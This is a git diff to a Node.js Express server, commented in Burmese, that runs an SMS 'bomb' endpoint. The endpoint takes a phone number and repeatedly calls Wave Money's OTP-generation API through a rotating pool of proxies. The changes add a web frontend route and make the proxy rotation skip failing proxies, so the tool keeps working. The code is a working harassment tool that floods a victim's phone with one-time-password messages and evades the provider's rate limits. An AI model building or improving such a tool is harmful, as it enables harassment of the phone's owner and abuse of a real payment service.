@@ -3,10 +3,14 @@ const axios = require('axios');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 const { SocksProxyAgent } = require('socks-proxy-agent');
 const cors = require('cors');
+const path = require('path');
 
 const app = express();
 app.use(cors());
 app.use(express.json());
+
+// Static Files (HTML) ကို public folder ထဲကနေ ဖတ်ခိုင်းမယ်
+app.use(express.static(path.join(__dirname, 'public')));
 
 // ==========================================
 // 100 PROXIES (Direct Load)
@@ -79,10 +83,15 @@ app.get('/api/bomb', async (req, res) => {
         proxyIndex++;
 
         let agent;
-        if (proxyUrl.startsWith('socks')) {
-            agent = new SocksProxyAgent(proxyUrl);
-        } else {
-            agent = new HttpsProxyAgent(proxyUrl);
+        try {
+            if (proxyUrl.startsWith('socks')) {
+                agent = new SocksProxyAgent(proxyUrl);
+            } else {
+                agent = new HttpsProxyAgent(proxyUrl);
+            }
+        } catch (e) {
+            attempts++;
+            continue;
         }
 
         const targetUrl = `https://api.wavemoney.io:8100/v3/wmt-mfs-otp/generate-otp?msisdn=${phone}`;
@@ -113,6 +122,11 @@ app.get('/api/bomb', async (req, res) => {
 
     // Proxy ၅ ခု ကျသွားလို့ မရခဲ့ရင်
     return res.status(502).json({ status: 'all_proxies_failed' });
+});
+
+// Frontend (HTML) ကို ပို့ပေးမယ့် Route
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 const PORT = process.env.PORT || 3000;
